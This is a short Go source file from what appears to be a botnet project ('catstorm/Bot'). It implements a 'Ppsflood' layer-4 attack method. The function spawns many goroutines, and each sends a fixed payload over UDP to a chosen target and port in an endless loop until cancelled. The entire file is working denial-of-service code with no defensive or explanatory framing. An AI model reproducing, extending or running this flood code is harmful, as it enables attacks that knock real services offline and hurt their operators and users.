package l4

import (
	"context"
	"net"
	"sync"
	"catstorm/Bot/Methods"
)

func Ppsflood(ctx context.Context, target, port string, sec int) {
	raddr, err := net.ResolveUDPAddr("udp", target+":"+port)
	if err != nil {
		return
	}

	var wg sync.WaitGroup
	workers := methods.Workers()
	payload := []byte("GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.DialUDP("udp", nil, raddr)
			if err != nil {
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					conn.Write(payload)
				}
			}
		}()
	}
	wg.Wait()
}
